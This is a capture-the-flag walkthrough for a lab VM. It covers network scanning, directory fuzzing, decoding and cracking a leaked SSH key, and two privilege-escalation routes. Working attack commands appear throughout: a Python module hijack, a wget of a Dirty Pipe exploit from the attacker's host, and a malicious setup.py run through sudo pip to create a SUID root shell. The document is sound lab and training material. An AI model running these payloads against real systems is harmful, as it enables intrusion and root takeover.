1. `sudo netdiscover -i eth0`
![image](https://hackmd.io/_uploads/H1GDTZJvge.png)
2. `nmap 192.168.163.129`
![image](https://hackmd.io/_uploads/BkP1A-kPee.png)
3. `sudo nmap -p -Pn -O -sV -sC -sS 192.168.163.129`
![image](https://hackmd.io/_uploads/HydaZmkvel.png)
4. `http://192.168.163.129`check website
![image](https://hackmd.io/_uploads/Bk_GRW1Dxx.png)
5. `dirb http://192.168.163.129`
found some directories show`is listable`
![image](https://hackmd.io/_uploads/SykQOGkvee.png)
check the directories
![image](https://hackmd.io/_uploads/HyS3DMyPle.png)
![image](https://hackmd.io/_uploads/HJ26Pz1Dxe.png)
![image](https://hackmd.io/_uploads/Sy11_zkDeg.png)
6. check robots.txt
![image](https://hackmd.io/_uploads/HJENjGywxx.png)
7. check /~myfiles/ page
![image](https://hackmd.io/_uploads/H1qwszyDxg.png)
8. `ffuf -u http://192.168.163.129/~FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 -c`
![image](https://hackmd.io/_uploads/HylTfmkwlx.png)
    - /~myfiles/ It was just a decoy; by fuzzing, I found the /~secret/ directory.
9. `http://192.168.163.129/~secret`
![image](https://hackmd.io/_uploads/Bytz87kPge.png)
    - according text, I know I should find a ssh private key file
10. `ffuf -w SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.163.129/~secret/.FUZZ -e .php,.txt,.html -mc 200`
![image](https://hackmd.io/_uploads/BJYRBKgwxg.png)
    - use fuzzing test to find hiding files
    - `-mc 200` let ffuf's output only includes directories with 200 ok, make results more clear and easier to read.
11. `curl http://192.168.163.129/~secret/.mysecret.txt`
```
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

```
12. I tried decoding it with different base encodings one by one and found that it was Base58.
![image](https://hackmd.io/_uploads/Sy3FjVkvel.png)
13. `nano id_rsa` make private key save to file
14. `chmod 600 id_rsa` set the correct permissions; SSH has very strict requirements for private key permissions and does not allow extra users to have read access. 
15. `ssh2john id_rsa > key.hash` use ssh2john to convert the key format: this tool extracts a crackable hash from your private key file
16. `john --wordlist=/usr/share/wordlists/fasttrack.txt key.hash`
![image](https://hackmd.io/_uploads/HkdlsUJDxe.png)
    - according to the hint"Its hided somewhere here, so that hackers dont find it and crack my passphrase with fasttrack." so I use fasttrack.txt to crack and get password - `P@55w0rd!`
17. `ssh -i id_rsa icex64@192.168.163.129` run SSH to login and check the table
![image](https://hackmd.io/_uploads/r1DTo81vgg.png)
18. `cat user.txt`
![image](https://hackmd.io/_uploads/r18d3Iywex.png)
    - find the first flag
    -  3mp!r3{I_See_That_You_Manage_To_Get_My_Bunny}
19. `wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
chmod +x linpeas_linux_amd64
./linpeas_linux_amd64`
![image](https://hackmd.io/_uploads/rkHn6IyPlg.png)
    - run `linpeas.sh`
20. privilege escalation path found
![image](https://hackmd.io/_uploads/H1Ff7vyPex.png)
    * icex64 can run `sudo` without password (NOPASSWD)
    * run as user arsene instead of root
    * can only run a specific command：/usr/bin/python3.9 /home/arsene/heist.py
21. `cat /hame/arsene/heist.py`
![image](https://hackmd.io/_uploads/Sk-RQv1Pgl.png)
    * heist.py scirpt seems harmless, it just imports webbrowser module and tries to open a web page
22. look `linpeas.sh` to see the result of webbrowser.py, it turns out I can write
![image](https://hackmd.io/_uploads/Hycw3Pywel.png)
23. `sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py`
![image](https://hackmd.io/_uploads/HksphvJweg.png)
    * icex64 can run heist.py as arsene through sudo 
    * heist.py import webbrowser module
    * add `os.system("/bin/bash") ` in webbrowser.py
    * this code is not being used as a function definition; it is being executed at the module level
    * when Python imports a module, the module-level code executes immediately
    * because heist.py is running as arsene, so generated bash shell also has arsene's privilege
24. `cat .secret`
![image](https://hackmd.io/_uploads/H1LDCvkPex.png)
    - I have no idea whether it's password(?
    - I dont like to forget my password "rQ8EE"UK,eV)weg~*nd-`5:{*"j7*Q"
---
### the first privilege escalation path
25. `wget http://192.168.163.128:8000/CVE/Dirty-Pipe.sh -O /tmp/DirtyPipe.sh`
![螢幕擷取畫面 2025-07-24 151920](https://hackmd.io/_uploads/S1wNkuJwel.png)
    - the CVE vulnerabilities found by `linpeas.sh` earlier include DirtyPipe
26. `chmod +x /tmp/DirtyPipe.sh` improve privilege
27. `bash Dirtypipe.sh`
![image](https://hackmd.io/_uploads/rkckyuyvge.png)
### the second privilege escalation path
28. `sudo -l`
![image](https://hackmd.io/_uploads/HyadIO1vgg.png)
    - arsene can run `/usr/bin/pip` command as root without password
29. prepare to improve privilege
```
mkdir /tmp/getroot
cd /tmp/getroot
mkdir pwn
```
30. create setup.py
```
cat << EOF > setup.py
from setuptools import setup
import os

os.system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash')

setup(name='pwn',
      version='1.0',
      packages=['pwn'])
EOF
```
   -  payload would copy `/bin/bash` to `/tmp/rootbash`, and set SUID privilege
31. `sudo /usr/bin/pip install .`
    - run pip install
32. `/tmp/rootbash -p`
    - after the installation completes, a SUID file named `rootbash` is created in `/tmp`. Execute it with the -p option to obtain a root shell.
33. `cat root.txt`
![image](https://hackmd.io/_uploads/HkePYukwex.png)
    - find a final flag !!!
    - 3mp!r3{congratulations_you_manage_to_pwn_the_lupin1_box}
